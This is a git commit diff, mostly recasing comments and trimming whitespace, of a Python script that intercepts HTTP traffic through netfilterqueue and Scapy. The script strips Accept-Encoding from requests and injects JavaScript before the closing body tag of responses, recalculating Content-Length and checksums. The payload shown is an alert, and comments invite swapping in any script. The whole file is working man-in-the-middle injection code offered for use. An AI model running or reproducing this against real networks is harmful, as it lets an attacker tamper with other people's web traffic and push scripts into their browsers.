e6e7f33173ce8f256c3ed81a65fb79ad49c443c3
mephisto-v <agentunknown@infopeklo.cz>
2025-05-05 14:55:33 +0200

    Update plugin.py

--- plugin.py
+++ plugin.py
@@ -3,10 +3,10 @@ from colorama import init, Fore
 import netfilterqueue
 import re
 
-# Initialize colorama
+# initialize colorama
 init()
 
-# Define colors
+# define colors
 GREEN = Fore.GREEN
 RESET = Fore.RESET
 
@@ -14,9 +14,8 @@ def process_packet(packet):
     """
     This function is executed whenever a packet is sniffed
     """
-    # Convert the netfilterqueue packet into Scapy packet
+    # convert the netfilterqueue packet into Scapy packet
     spacket = IP(packet.get_payload())
-    
     if spacket.haslayer(Raw) and spacket.haslayer(TCP):
         if spacket[TCP].dport == 80:
             # HTTP request
@@ -24,26 +23,22 @@ def process_packet(packet):
             try:
                 load = spacket[Raw].load.decode()
             except Exception as e:
-                # Raw data cannot be decoded, apparently not HTML
-                # Forward the packet and exit the function
+                # raw data cannot be decoded, apparently not HTML
+                # forward the packet exit the function
                 packet.accept()
                 return
-            
-            # Remove Accept-Encoding header from the HTTP request
+            # remove Accept-Encoding header from the HTTP request
             new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)
-            
-            # Set the new data
+            # set the new data
             spacket[Raw].load = new_load
-            
-            # Set IP length header, checksums of IP and TCP to None
-            # so Scapy will recalculate them automatically
+            # set IP length header, checksums of IP and TCP to None
+            # so Scapy will re-calculate them automatically
             spacket[IP].len = None
             spacket[IP].chksum = None
             spacket[TCP].chksum = None
+            # set the modified Scapy packet back to the netfilterqueue packet
+            packet.set_payload(bytes(spacket))        
             
-            # Set the modified Scapy packet back to the netfilterqueue packet
-            packet.set_payload(bytes(spacket))
-
         if spacket[TCP].sport == 80:
             # HTTP response
             print(f"[*] Detected HTTP Response from {spacket[IP].src} to {spacket[IP].dst}")
@@ -52,54 +47,45 @@ def process_packet(packet):
             except:
                 packet.accept()
                 return
-            
-            # Inject JavaScript code or HTML (you can choose what to inject)
+            # if you want to debug and see the HTML data
+            # print("Load:", load)
+            # Javascript code to add, feel free to add any Javascript code
             added_text = "<script>alert('Javascript Injected successfully!');</script>"
-            # Alternatively, inject HTML instead:
+            # or you can add HTML as well!
             # added_text = "<p><b>HTML Injected successfully!</b></p>"
-            
-            # Calculate the length in bytes (each character corresponds to a byte)
+            # calculate the length in bytes, each character corresponds to a byte
             added_text_length = len(added_text)
-            
-            # Replace the </body> tag with the added text plus </body>
+            # replace the </body> tag with the added text plus </body>
             load = load.replace("</body>", added_text + "</body>")
-            
             if "Content-Length" in load:
-                # If Content-Length header is available
-                # Get the old Content-Length value
+                # if Content-Length header is available
+                # get the old Content-Length value
                 content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))
-                
-                # Recalculate the content length by adding the length of the injected code
+                # re-calculate the content length by adding the length of the injected code
                 new_content_length = content_length + added_text_length
-                
-                # Replace the new content length in the header
+                # replace the new content length to the header
                 load = re.sub(r"Content-Length:.*\r\n", f"Content-Length: {new_content_length}\r\n", load)
-                
-                # Print a message if the injection was successful
+                # print a message if injected
                 if added_text in load:
                     print(f"{GREEN}[+] Successfully injected code to {spacket[IP].dst}{RESET}")
-            
-            # Set the new data
+            # if you want to debug and see the modified HTML data
+            # print("Load:", load)
+            # set the new data
             spacket[Raw].load = load
-            
-            # Set IP length header, checksums of IP and TCP to None
-            # so Scapy will recalculate them automatically
+            # set IP length header, checksums of IP and TCP to None
+            # so Scapy will re-calculate them automatically
             spacket[IP].len = None
             spacket[IP].chksum = None
             spacket[TCP].chksum = None
-            
-            # Set the modified Scapy packet back to the netfilterqueue packet
+            # set the modified Scapy packet back to the netfilterqueue packet
             packet.set_payload(bytes(spacket))
-    
-    # Accept all the packets
+    # accept all the packets
     packet.accept()
 
 if __name__ == "__main__":
-    # Initialize the queue
+    # initialize the queue
     queue = netfilterqueue.NetfilterQueue()
-    
-    # Bind the queue number 0 to the process_packet() function
+    # bind the queue number 0 to the process_packet() function
     queue.bind(0, process_packet)
-    
-    # Start the filter queue
+    # start the filter queue
     queue.run()
